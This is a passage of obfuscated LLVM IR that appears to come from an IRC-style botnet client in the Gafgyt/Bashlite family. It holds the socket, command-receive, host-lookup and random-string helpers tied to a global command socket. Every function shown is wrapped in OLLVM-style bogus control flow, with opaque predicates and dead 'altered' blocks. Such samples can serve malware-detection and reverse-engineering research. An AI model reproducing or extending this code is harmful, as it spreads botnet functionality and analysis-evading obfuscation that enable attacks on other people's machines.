  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.73, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %70 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %92

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %92

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* @x.37
  %39 = load i32, i32* @y.38
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp ne i32 %48, 0
  %50 = load i32, i32* @x.37
  %51 = load i32, i32* @y.38
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %58, label %66

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = load i8*, i8** %4, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 1
  %61 = load i8*, i8** %5, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = call i32 @wildString(i8* %60, i8* %62)
  %64 = icmp ne i32 %63, 0
  %65 = xor i1 %64, true
  br label %66

; <label>:66:                                     ; preds = %58, %originalBBpart2
  %67 = phi i1 [ false, %originalBBpart2 ], [ %65, %58 ]
  %68 = xor i1 %67, true
  %69 = zext i1 %68 to i32
  store i32 %69, i32* %3, align 4
  br label %92

; <label>:70:                                     ; preds = %2
  %71 = load i8*, i8** %4, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = call i32 @toupper(i32 %73) #9
  %75 = load i8*, i8** %5, align 8
  %76 = load i8, i8* %75, align 1
  %77 = zext i8 %76 to i32
  %78 = call i32 @toupper(i32 %77) #9
  %79 = icmp eq i32 %74, %78
  br i1 %79, label %80, label %88

; <label>:80:                                     ; preds = %70
  %81 = load i8*, i8** %4, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 1
  %83 = load i8*, i8** %5, align 8
  %84 = getelementptr inbounds i8, i8* %83, i64 1
  %85 = call i32 @wildString(i8* %82, i8* %84)
  %86 = icmp ne i32 %85, 0
  %87 = xor i1 %86, true
  br label %88

; <label>:88:                                     ; preds = %80, %70
  %89 = phi i1 [ false, %70 ], [ %87, %80 ]
  %90 = xor i1 %89, true
  %91 = zext i1 %90 to i32
  store i32 %91, i32* %3, align 4
  br label %92

; <label>:92:                                     ; preds = %88, %66, %33, %9
  %93 = load i32, i32* @x.37
  %94 = load i32, i32* @y.38
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %92
  %101 = load i32, i32* %3, align 4
  %102 = load i32, i32* @x.37
  %103 = load i32, i32* @y.38
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %101

originalBBalteredBB:                              ; preds = %originalBB, %37
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp ne i32 %112, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %92
  %114 = load i32, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = load i32, i32* @x.39
  %4 = load i32, i32* @y.40
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.in_addr*, align 8
  %14 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %12, align 8
  store %struct.in_addr* %1, %struct.in_addr** %13, align 8
  %15 = load i8*, i8** %12, align 8
  %16 = call i32 @inet_addr(i8* %15) #5
  %17 = load %struct.in_addr*, %struct.in_addr** %13, align 8
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = icmp eq i32 %16, -1
  %20 = load i32, i32* @x.39
  %21 = load i32, i32* @y.40
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %29

; <label>:28:                                     ; preds = %originalBBpart2
  store i32 1, i32* %11, align 4
  br label %46

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.39
  %31 = load i32, i32* @y.40
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  store i32 0, i32* %11, align 4
  %38 = load i32, i32* @x.39
  %39 = load i32, i32* @y.40
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %46

; <label>:46:                                     ; preds = %originalBBpart24, %28
  %47 = load i32, i32* %11, align 4
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %2
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca %struct.in_addr*, align 8
  %51 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %49, align 8
  store %struct.in_addr* %1, %struct.in_addr** %50, align 8
  %52 = load i8*, i8** %49, align 8
  %53 = call i32 @inet_addr(i8* %52) #5
  %54 = load %struct.in_addr*, %struct.in_addr** %50, align 8
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = icmp eq i32 %53, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  store i32 0, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  %23 = load i32, i32* @x.41
  %24 = load i32, i32* @y.42
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i32, i32* @x.41
  %32 = load i32, i32* @y.42
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %22
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %118

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %97, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %101

; <label>:53:                                     ; preds = %50
  %54 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %54, align 8
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %55, align 8
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @x.43
  %58 = load i32, i32* @y.44
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %56
  %65 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %66 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 0
  %67 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %66) #5, !srcloc !3
  %68 = extractvalue { i64, i64* } %67, 0
  %69 = extractvalue { i64, i64* } %67, 1
  %70 = trunc i64 %68 to i32
  store i32 %70, i32* %14, align 4
  %71 = ptrtoint i64* %69 to i64
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %15, align 4
  %73 = load i32, i32* @x.43
  %74 = load i32, i32* @y.44
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %81

; <label>:81:                                     ; preds = %originalBBpart2
  %82 = load i32, i32* %5, align 4
  %83 = srem i32 %82, 64
  %84 = zext i32 %83 to i64
  %85 = shl i64 1, %84
  %86 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %87 = load i32, i32* %5, align 4
  %88 = sdiv i32 %87, 64
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [16 x i64], [16 x i64]* %86, i64 0, i64 %89
  %91 = load i64, i64* %90, align 8
  %92 = or i64 %91, %85
  store i64 %92, i64* %90, align 8
  %93 = load i32, i32* %5, align 4
  %94 = add nsw i32 %93, 1
  %95 = call i32 @select(i32 %94, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %95, i32* %12, align 4
  %96 = icmp sle i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %81
  %98 = load i32, i32* %13, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %13, align 4
  br label %50

; <label>:100:                                    ; preds = %81
  br label %101

; <label>:101:                                    ; preds = %100, %50
  %102 = load i32, i32* @x.43
  %103 = load i32, i32* @y.44
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %101
  %110 = load i32, i32* @x.43
  %111 = load i32, i32* @y.44
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %118

; <label>:118:                                    ; preds = %originalBBpart24, %33
  store i32 0, i32* %18, align 4
  %119 = load i8*, i8** %6, align 8
  store i8* %119, i8** %17, align 8
  br label %120

; <label>:120:                                    ; preds = %154, %118
  %121 = load i32, i32* @x.43
  %122 = load i32, i32* @y.44
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %120
  %129 = load i32, i32* %7, align 4
  %130 = add nsw i32 %129, -1
  store i32 %130, i32* %7, align 4
  %131 = icmp sgt i32 %129, 1
  %132 = load i32, i32* @x.43
  %133 = load i32, i32* @y.44
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart218, label %originalBB6alteredBB

originalBBpart218:                                ; preds = %originalBB6
  br i1 %131, label %140, label %157

; <label>:140:                                    ; preds = %originalBBpart218
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i64 @recv(i32 %141, i8* %16, i64 1, i32 0)
  %143 = icmp ne i64 %142, 1
  br i1 %143, label %144, label %146

; <label>:144:                                    ; preds = %140
  %145 = load i8*, i8** %17, align 8
  store i8 0, i8* %145, align 1
  store i32 -1, i32* %4, align 4
  br label %176

; <label>:146:                                    ; preds = %140
  %147 = load i8, i8* %16, align 1
  %148 = load i8*, i8** %17, align 8
  %149 = getelementptr inbounds i8, i8* %148, i32 1
  store i8* %149, i8** %17, align 8
  store i8 %147, i8* %148, align 1
  %150 = load i8, i8* %16, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 10
  br i1 %152, label %153, label %154

; <label>:153:                                    ; preds = %146
  br label %157

; <label>:154:                                    ; preds = %146
  %155 = load i32, i32* %18, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %18, align 4
  br label %120

; <label>:157:                                    ; preds = %153, %originalBBpart218
  %158 = load i32, i32* @x.43
  %159 = load i32, i32* @y.44
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %157
  %166 = load i8*, i8** %17, align 8
  store i8 0, i8* %166, align 1
  %167 = load i32, i32* %18, align 4
  store i32 %167, i32* %4, align 4
  %168 = load i32, i32* @x.43
  %169 = load i32, i32* @y.44
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %176

; <label>:176:                                    ; preds = %originalBBpart222, %144
  %177 = load i32, i32* %4, align 4
  ret i32 %177

originalBBalteredBB:                              ; preds = %originalBB, %56
  %178 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %179 = getelementptr inbounds [16 x i64], [16 x i64]* %178, i64 0, i64 0
  %180 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %179) #5, !srcloc !3
  %181 = extractvalue { i64, i64* } %180, 0
  %182 = extractvalue { i64, i64* } %180, 1
  %183 = trunc i64 %181 to i32
  store i32 %183, i32* %14, align 4
  %184 = ptrtoint i64* %182 to i64
  %185 = trunc i64 %184 to i32
  store i32 %185, i32* %15, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %101
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %120
  %186 = load i32, i32* %7, align 4
  %_ = sub i32 0, %186
  %gen = add i32 %_, -1
  %_7 = sub i32 %186, -1
  %gen8 = mul i32 %_7, -1
  %_9 = sub i32 %186, -1
  %gen10 = mul i32 %_9, -1
  %_11 = sub i32 0, %186
  %gen12 = add i32 %_11, -1
  %_13 = sub i32 0, %186
  %gen14 = add i32 %_13, -1
  %_15 = sub i32 %186, -1
  %gen16 = mul i32 %_15, -1
  %187 = add nsw i32 %186, -1
  store i32 %187, i32* %7, align 4
  %188 = icmp sgt i32 %186, 1
  br label %originalBB6

originalBB20alteredBB:                            ; preds = %originalBB20, %157
  %189 = load i8*, i8** %17, align 8
  store i8 0, i8* %189, align 1
  %190 = load i32, i32* %18, align 4
  store i32 %190, i32* %4, align 4
  br label %originalBB20
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %4
  %37 = load i32, i32* @x.45
  %38 = load i32, i32* @y.46
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  store i32 0, i32* %5, align 4
  %45 = load i32, i32* @x.45
  %46 = load i32, i32* @y.46
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %196

; <label>:53:                                     ; preds = %4
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %55 = getelementptr inbounds [8 x i8], [8 x i8]* %54, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 8, i32 4, i1 false)
  %56 = load i32, i32* %6, align 4
  %57 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 16)
  store i32 %58, i32* %16, align 4
  %59 = load i32, i32* %16, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %171

; <label>:61:                                     ; preds = %53
  %62 = load i32, i32* @x.45
  %63 = load i32, i32* @y.46
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = call i32* @__errno_location() #10
  %71 = load i32, i32* %70, align 4
  %72 = icmp eq i32 %71, 115
  %73 = load i32, i32* @x.45
  %74 = load i32, i32* @y.46
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %72, label %81, label %153

; <label>:81:                                     ; preds = %originalBBpart24
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %83, i64* %84, align 8
  %85 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %85, align 8
  br label %86

; <label>:86:                                     ; preds = %81
  %87 = load i32, i32* @x.45
  %88 = load i32, i32* @y.46
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %96 = getelementptr inbounds [16 x i64], [16 x i64]* %95, i64 0, i64 0
  %97 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %96) #5, !srcloc !4
  %98 = extractvalue { i64, i64* } %97, 0
  %99 = extractvalue { i64, i64* } %97, 1
  %100 = trunc i64 %98 to i32
  store i32 %100, i32* %17, align 4
  %101 = ptrtoint i64* %99 to i64
  %102 = trunc i64 %101 to i32
  store i32 %102, i32* %18, align 4
  %103 = load i32, i32* @x.45
  %104 = load i32, i32* @y.46
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %111

; <label>:111:                                    ; preds = %originalBBpart28
